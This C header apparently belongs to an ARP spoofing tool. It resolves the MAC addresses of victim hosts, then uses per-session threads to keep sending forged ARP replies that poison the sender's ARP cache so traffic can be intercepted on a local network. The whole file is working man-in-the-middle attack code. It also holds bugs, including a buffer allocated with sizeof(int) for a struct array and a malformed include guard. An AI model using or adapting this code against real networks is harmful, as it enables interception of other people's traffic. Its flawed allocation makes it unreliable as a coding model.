#include "ethernethelper.h"
#include "arphelper.h"
#include "iphelper.h"
#include "tcphelper.h"
#include "udphelper.h"
#include "packetmaker.h"
#include "packetAnalyzer.h" 

#ifndef ARPSOOP_H
#define ARPSOOP_Hd


void printipSets(int n){
	printf("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
  printf("session set [%d] infomation\n", n); 
  printDecValue("sender ip \t: ", sessions[n].senderIp, 4, '.');
  printHexValue("sender mac \t: ", sessions[n].senderMac, 6, ':');
  printDecValue("target ip \t: ", sessions[n].targetIp, 4, '.');
  printHexValue("target mac \t: ", sessions[n].targetMac, 6, ':');
  printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
	fflush(stdout) ; 
}

void printSignal(){
  for(int i =0 ; i < sessionSize; i++)
    printf("[%d] = %d \t", i, threadSignal[i]);
	fflush(stdout);
}

void tryingInfection(int num){
	for(int i = 0; i < 3; i++)
		sendArp(handle, mac, sessions[num].targetIp, sessions[num].senderMac, sessions[num].senderIp, 0); 
	return; 
}

int basicSetting(int argc, char* argv[]){
  if (argc >= 4 && argc%2 != 0) {
    usage();
    return -1;
  }
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  getIp(ip, dev);
  printDecValue("[+] ip : ", ip, 4, '.');
  getMac(mac, dev);
  printHexValue("[+] mac : ", mac, 6, ':');

  sessionSize= argc/2 -1;
  sessionNumber = (int*) malloc(sizeof(int)*sessionSize);
  for(int i= 0; i < sessionSize; i++)
    sessionNumber[i] = i;
  pthread_mutex_init(&mutex, NULL);
  threadSignal = (int*)malloc(sizeof(int)*(sessionSize));
  for(int i = 0; i < sessionSize; i++)
    threadSignal[i] = 0;
  sessions = (sessionInfo*) malloc(sizeof(int)*(sessionSize));
  return 1;
}

void* arpSpoofer(void* idx){
  int num = *(int*)idx;
	printf("\n==== session handler thread %d ====\n", num); 
	printipSets(num); 
	while(1){
		if(threadSignal[num] == 0){ 
			continue; 
		}
		tryingInfection(num); 
		resetSignal(num); 
	}
}

bool getOtherMac(uint8_t* targetIp, uint8_t* targetMac){
	for(int j= 0; j < 3; j++){
    uint8_t tmp[6] = {0, };
    sendArp(handle, mac, ip, tmp, targetIp, 1);
		
		for(int i= 0; i < 5; i++){
			struct pcap_pkthdr* header;
    	const u_char* packet;
			pthread_mutex_lock(&mutex);
			int res = pcap_next_ex(handle, &header, &packet);
			pthread_mutex_unlock(&mutex);
			if (res == 0) continue;
			if (res == -1 || res == -2) break;
			if (isArpReply(targetMac, targetIp, header, packet)){
				printHexValue("[+] find sender mac : ", targetMac, 6, ':');
				return true; 
			}
		}
	}
	return false; 
}

int sessionSetting(int argc, char* argv[]){
  for(int i = 0; i <sessionSize; i++){
    printf("\n ==== session %d ====\n", i);
    sessionInfo* ips = &(sessions[i]); 

    uint32_t sender_ip_temp = inet_addr(argv[(i+1)*2]);
    if(sender_ip_temp == INADDR_NONE){
      printf("ERROR::invalid ip address\n");
      return -1;
    }
    memcpy(ips->senderIp, &sender_ip_temp, 4);
    printDecValue("[+] sender ip : ", ips->senderIp, 4, '.');

    uint32_t target_ip_temp = inet_addr(argv[(i+1)*2+1]);
    if(target_ip_temp == INADDR_NONE) {
      printf("ERROR::invalid ip address\n");
      return -1;
    }
    memcpy(ips->targetIp, &target_ip_temp, 4);
    printDecValue("[+] target ip : ", ips->targetIp, 4, '.');

		getOtherMac(ips->senderIp, ips->senderMac); 
		getOtherMac(ips->targetIp, ips->targetMac); 

		printf("[+] trying infection  \n", i); 
		tryingInfection(i); 
	}

	for(int i= 0; i < sessionSize; i++) {
		pthread_t tid; 
		pthread_create(&tid, NULL, arpSpoofer, (void*)(sessionNumber+i)); 
		pthread_detach(tid); 
	}

  return 1;
} 
#endif //ARPSOOP_H 
